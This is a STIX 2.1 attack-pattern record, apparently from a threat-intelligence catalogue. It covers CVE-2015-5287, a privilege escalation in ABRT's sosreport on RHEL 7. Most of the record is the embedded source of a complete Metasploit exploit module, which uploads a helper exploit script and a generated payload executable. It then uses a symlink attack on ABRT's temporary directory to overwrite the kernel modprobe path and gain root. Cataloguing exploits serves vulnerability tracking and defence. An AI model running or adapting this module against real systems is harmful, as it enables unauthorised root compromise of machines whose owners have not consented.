{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d68f3d7-226b-4739-8c01-e54bbec09dd8",
    "created": "2024-08-14T16:59:14.282229Z",
    "modified": "2024-08-14T16:59:14.282232Z",
    "name": "ABRT sosreport Privilege Escalation",
    "description": " This module attempts to gain root privileges on RHEL systems with a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured as the crash handler.  `sosreport` uses an insecure temporary directory, allowing local users",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/abrt_sosreport_priv_esc.rb",
            "external_id": "abrt_sosreport_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-5287"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2015/12/01/1"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/errata/RHSA-2015:2505"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/CVE-2015-5287"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1266837"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ABRT sosreport Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on RHEL systems with\n        a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured\n        as the crash handler.\n\n        `sosreport` uses an insecure temporary directory, allowing local users\n        to write to arbitrary files (CVE-2015-5287). This module uses a symlink\n        attack on `/var/tmp/abrt/cc-*$pid/` to overwrite the `modprobe` path\n        in `/proc/sys/kernel/modprobe`, resulting in root privileges.\n\n        Waiting for `sosreport` could take a few minutes.\n\n        This module has been tested successfully on:\n\n        abrt 2.1.11-12.el7 on RHEL 7.0 x86_64; and\n        abrt 2.1.11-19.el7 on RHEL 7.1 x86_64.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rebel', # Discovery and sosreport-rhel7.py exploit\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2015-11-23',\n      'Platform'       => ['linux'],\n      'Arch'           =>\n        [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [[ 'Auto', {} ]],\n      'References'     =>\n        [\n          ['BID', '78137'],\n          ['CVE', '2015-5287'],\n          ['EDB', '38832'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2015/12/01/1'],\n          ['URL', 'https://access.redhat.com/errata/RHSA-2015:2505'],\n          ['URL', 'https://access.redhat.com/security/cve/CVE-2015-5287'],\n          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1266837']\n        ]\n    ))\n    register_options [\n      OptInt.new('TIMEOUT', [true, 'Timeout for sosreport (seconds)', '600'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\n\n  def check\n    kernel_core_pattern = cmd_exec 'grep abrt-hook-ccpp /proc/sys/kernel/core_pattern'\n    unless kernel_core_pattern.include? 'abrt-hook-ccpp'\n      vprint_error 'System is not configured to use ABRT for crash reporting'\n      return CheckCode::Safe\n    end\n    vprint_good 'System is configured to use ABRT for crash reporting'\n\n    if cmd_exec('systemctl status abrt-ccpp | grep Active').include? 'inactive'\n      vprint_error 'abrt-ccp service not running'\n      return CheckCode::Safe\n    end\n    vprint_good 'abrt-ccpp service is running'\n\n    # Patched in 2.1.11-35.el7\n    pkg_info = cmd_exec('yum list installed abrt | grep abrt').to_s\n    abrt_version = pkg_info[/^abrt.*$/].to_s.split(/\\s+/)[1]\n    if abrt_version.blank?\n      vprint_status 'Could not retrieve ABRT package version'\n      return CheckCode::Safe\n    end\n    unless Rex::Version.new(abrt_version) < Rex::Version.new('2.1.11-35.el7')\n      vprint_status \"ABRT package version #{abrt_version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"ABRT package version #{abrt_version} is vulnerable\"\n\n    unless command_exists? 'python'\n      vprint_error 'python is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'python is installed'\n\n    CheckCode::Appears\n  end\n\n  def upload_and_chmodx(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    chmod path\n    register_file_for_cleanup path\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    exe_data = ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2015-5287', 'sosreport-rhel7.py')\n    exe_name = \".#{rand_text_alphanumeric 5..10}\"\n    exe_path = \"#{base_dir}/#{exe_name}\"\n    upload_and_chmodx exe_path, exe_data\n\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric 5..10}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    register_file_for_cleanup '/tmp/hax.sh'\n\n    print_status \"Launching exploit - This might take a few minutes (Timeout: #{timeout}s) ...\"\n    output = cmd_exec \"echo \\\"#{payload_path}& exit\\\" | #{exe_path}\", nil, timeout\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-11-23",
    "x_mitre_platforms": [
        "['linux']"
    ]
}